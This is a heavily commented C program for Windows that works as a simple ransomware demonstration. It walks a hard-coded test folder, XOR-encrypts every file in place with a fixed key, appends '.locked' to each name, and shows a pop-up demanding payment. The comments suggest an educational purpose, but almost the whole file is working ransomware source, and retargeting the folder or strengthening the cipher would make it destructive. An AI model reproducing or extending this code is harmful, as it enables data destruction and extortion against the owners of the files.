#include <windows.h>
// To use windows API functions as we will see down
#include <stdio.h>
//Used for printf, fopen functions
#include <stdlib.h>
//Used for memory allocation malloc()
#include <string.h>
//Used for string functions

#define ENCRYPTION_KEY "MySecretKey"

// Function to Encrypt the file silently
void EncryptFileSilently(const char *filePath)
//This function takes a file path as input and encrypts it
 {
    FILE *file = fopen(filePath, "rb+");
    //Open the file in Read + write binary mode
    if (!file) {
        printf("Failed to open file: %s\n", filePath);
        return;
        //If the file cannot be opened the if part is executed print the message and exits
    }
    
    fseek(file, 0, SEEK_END);
    //Move the pointer to the end of the file because the end position tells us the size
    long fileSize = ftell(file);
    //ftell file returns the current position of the file pointer which is now at the end 
    rewind(file);
    //Move the file pointer back to the beginning so we can read the file from the start
    char *buffer = (char *)malloc(fileSize);
    //malloc(fileSize) Allocates enough memory to store the entire file content
    if (!buffer) {
        fclose(file);
        return;
    }
    //If memory allocation fails the function exists
    fread(buffer, 1, fileSize, file);
    //This line reads the whole file into memory
    rewind(file);
    
    for (long i = 0; i < fileSize; i++)
    //Looks through every byte of the file data stored in buffer
    //File size tells us how many bytes to process
     {
        buffer[i] ^= ENCRYPTION_KEY[i % strlen(ENCRYPTION_KEY)];
        //Here we used a XOR operation which is applied to each byte in the buffer
        //The key ENCRYPTION_KEY is repeated for every byte using modulo (%)
        //This scrambles the file data, making it unreadable without the key
    }
    
    fwrite(buffer, 1, fileSize, file);
    // Buffer --- contains the modified encrypted data
    // 1 --- means we are writing on one byte at a time
    // filesize --- specifies how many bytes to write (entire file)
    // file --- The file where we are writing the new data
    fclose(file);
    //Closes the file
    free(buffer);
    //Releases allocated memory

    // Rename the file to append ".locked"
    char encryptedFilePath[MAX_PATH];
    //This is an array to store the new file name
    //
    snprintf(encryptedFilePath, MAX_PATH, "%s.locked", filePath);
    //Have we used snprintf to avoid buffer overflow, this line adds 
    //[.locked] to the original file name
    //What is buffer overflow?
    //Buffer overflow is a type of problem that happens when a program writes more data 
    // into a buffer (fixed-size memory) then it can hold causing memory corruption crashes or 
    // security vulnerabilities
    rename(filePath, encryptedFilePath);
    //Renames the file from its original name to the new encrypted name

    printf("Encrypted: %s → %s\n", filePath, encryptedFilePath);
}
//Displays a message in the console showing the original file name and its new encrypted name

// Function to check if file is encrypted (i.e., has .locked extension)
int IsFileEncrypted(const char *filePath) {
    const char *lockedExtension = ".locked";
    size_t len = strlen(filePath);
    //Finds the number of characters in file path
    return (len >= strlen(lockedExtension)
    //File if file path has fewer than 7 characters it cannot end in dot lock so we return 0(false)
     && strcmp(filePath + len - strlen(lockedExtension), lockedExtension) == 0);
     //This moves the pointer to the last 7 characters of the file [".locked"]
     //strcmp(....) == 0 checks if these last characters match with ".locked" .
       //If yes, the function returns 1(true) ---- file is encrypted
       //if no it returns 0(false) ---- file is not encrypted

}

// Function to show a message box if file is encrypted
void ShowMessage() {
    MessageBox(NULL, "Your files are encrypted. You can't access this file. Pay to open your files.", "Warning", MB_ICONWARNING | MB_OK);
}
//Here a windows pop up warning comes up that all files are encrypted

// Simulating a user trying to open an encrypted file :
void TryToOpenFile(const char *filePath) {
    if (IsFileEncrypted(filePath)) {
        ShowMessage(); // Pop-up will show if the file is encrypted
    } else {
        printf("You can open the file: %s\n", filePath);
    }
}
// If the file is encrypted it shows a pop up otherwise it allows access
// Main function
int main() {
    const char *targetDirectory = "C:\\RANSOMEWARE TEST FOLDER";
    // This is the EXACT folder where ransomware will search for files 
    
    // Step 1: Encrypt files silently in the directory
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;
    
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", targetDirectory);
    
    hFind = FindFirstFile(searchPath, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Failed to open directory: %s\n", targetDirectory);
        return 1;
    }
    //If the directory is invalid prints an error message
    
    do {
        if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
        // This here only processes files skips directories
         {
            char filePath[MAX_PATH];
            snprintf(filePath, MAX_PATH, "%s\\%s", targetDirectory, findFileData.cFileName);
            // Here we put our target directory ransomware test folder and we
            //have put only one file that's inside our target folder
            EncryptFileSilently(filePath);  // Encrypt file silently without pop-up
        }
        // So, the final output stored in filePath is "C: \\RANSOMWARE TEST FOLDER\\name of the file.txt"
    } while (FindNextFile(hFind, &findFileData) != 0);
    //The loop continues until there are no more files
    //You also used another windows API function(FindNextFile) here
    
    FindClose(hFind);

    // Step 2: Let's Simulate accessing an encrypted file
    // We can change this file name to simulate opening another encrypted file
    char filePath[MAX_PATH];
    snprintf(filePath, MAX_PATH, "%s\\random.txt.locked", targetDirectory);
    
    // Simulate opening the file
    TryToOpenFile(filePath);  //A Pop-up will show if the file is encrypted

    return 0;
}
